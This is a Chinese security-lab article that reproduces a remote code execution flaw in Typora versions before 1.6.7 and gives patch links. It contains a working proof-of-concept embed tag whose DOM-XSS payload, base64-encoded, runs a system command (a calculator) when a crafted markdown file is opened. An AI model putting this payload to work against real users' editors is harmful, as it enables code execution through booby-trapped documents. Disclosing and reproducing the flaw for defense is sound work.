> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xj08AP19KyFLYwWtHwmDrQ)

  

网安引领时代，弥天点亮未来   

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00 写在前面**  

  

**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01 漏洞介绍**

Typora 是一款编辑器。

Typora 1.6.7 之前版本存在安全漏洞，该漏洞源于通过在标签中加载 typora://app/typemark/updater/update.html ，可以在 Typora 主窗口中加载 JavaScript 代码。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 影响版本**  

Typora < 1.6.7

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCN1N2liabhONiblGBbcrrzFVicQWeFTsu2cUkT4aAI33ffPkWiaGAr5Gwqvt6RibjBwlia2vxdgd9icDbtA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 漏洞复现**  

  

1. 下载部署有漏洞版本环境, 这里部署版本为

Typora for Windows 1.5.12

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCN1N2liabhONiblGBbcrrzFVX1sL5mRBfXRgmoC1meSWp4wic9k0LeyehlTbgZrR1bywdvpPcYJxdfw/640?wx_fmt=png)

2. 对漏洞进行复现

 **POC** 

```
<embed src="typora://app/typemark/updater/updater.html?curVersion=111&newVersion=222&releaseNoteLink=333&hideAutoUpdates=false&labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ=='))><%2fsvg>%22,%22%22,%22%22,%22%22,%22%22]">

```

base64 解码

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCN1N2liabhONiblGBbcrrzFVnSVdLGNLFWibaTwEjdCVxMNjwjX9cDrV60JFZz1GS6MKCdkIWRoJbdw/640?wx_fmt=png)

当在 Typora 中加载此 PoC 时，使用 DOM-XSS Payload 加载 updater.html，有效负载在主窗口上执行 JavaScript 代码，执行系统命令。具体操作如下：

1. 新建 md 文件，写入 poc 代码，注意类型为 html  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCN1N2liabhONiblGBbcrrzFV6czSxavBgZbw2VxyJvkwibHToFDIYtSqA9BbSWiaMticgicTWFMbTAEUsQ/640?wx_fmt=png)

2. 然后打开文件，将进行命令执行。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCN1N2liabhONiblGBbcrrzFVnyIYEy8DACic26niaicDbFTybAO5pbYIZ01CBStpng6IBZeicMtpZEk7XA/640?wx_fmt=png)

测试视频  

[视频详情](javascript:;)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 修复建议**  

  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://support.typora.io/What's-New-1.6/
https://buaq.net/go-175535.html?utm_source=feedly

```

**弥天简介**

**学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。**

**口号 网安引领时代，弥天点亮未来**

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)